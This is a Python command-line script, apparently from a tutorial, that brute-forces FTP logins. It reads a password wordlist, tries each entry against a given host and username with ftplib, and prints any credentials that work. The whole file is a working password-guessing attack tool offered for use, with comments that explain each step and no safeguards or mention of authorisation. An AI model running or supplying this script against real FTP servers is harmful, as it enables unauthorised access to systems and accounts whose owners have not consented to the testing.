import ftplib
from colorama import Fore, init # for fancy colors, nothing else
import argparse

# init the console for colors (for Windows)
init()
# port of FTP, aka 21
port = 21

def is_correct(host, user, password):
    # initialize the FTP server object
    server = ftplib.FTP()
    print(f"[!] Trying", password)
    try:
        # tries to connect to FTP server with a timeout of 5
        server.connect(host, port, timeout=5)
        # login using the credentials (user & password)
        server.login(user, password)
    except ftplib.error_perm:
        # login failed, wrong credentials
        return False
    else:
        # correct credentials
        print(f"{Fore.GREEN}[+] Found credentials: ")
        print(f"\tHost: {host}")
        print(f"\tUser: {user}")
        print(f"\tPassword: {password}{Fore.RESET}")
        return True

    
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="FTP server bruteforcing script")
    parser.add_argument("host", help="Hostname of IP address of the FTP server to bruteforce.")
    parser.add_argument("-u", "--user", help="The host username")
    parser.add_argument("-P", "--passlist", help="File that contain the password list separated by new lines")
    
    args = parser.parse_args()
    # hostname or IP address of the FTP server
    host = args.host
    # username of the FTP server, root as default for linux
    user = args.user
    # read the wordlist of passwords
    passwords = open(args.passlist).read().split("\n")
    print("[+] Passwords to try:", len(passwords))
    
    # iterate over passwords one by one
    # if the password is found, break out of the loop
    for password in passwords:
        if is_correct(host, user, password):
            break